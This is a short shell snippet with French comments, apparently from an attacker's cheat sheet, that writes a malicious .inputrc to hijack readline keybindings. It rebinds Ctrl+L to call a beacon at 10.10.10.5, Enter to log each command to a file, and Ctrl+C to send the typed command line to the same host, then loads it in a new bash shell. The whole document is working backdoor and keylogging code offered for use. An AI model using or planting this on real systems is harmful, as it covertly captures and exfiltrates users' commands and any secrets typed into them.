```sh -cwn
# INPUTRC - Detourner les keybindings readline
$ cat > /tmp/.inputrc << 'INEOF'
# Ctrl+L nettoie l'ecran ET execute le payload
"\C-l": "\C-uclear; curl -s http://10.10.10.5/beacon\C-m"
# Enter log la commande avant execution
RETURN: "\C-e | tee -a /tmp/cmd.log\C-m"
# Ctrl+C envoie la commande avant SIGINT
"\C-c": "\C-a\C-k curl -s 'http://10.10.10.5/abort?c=\C-y' &\C-m\C-c"
INEOF
$ export INPUTRC=/tmp/.inputrc
$ bash  # Nouveau shell charge inputrc
# Chaque Enter, Ctrl+C, Ctrl+L est backdoore
```
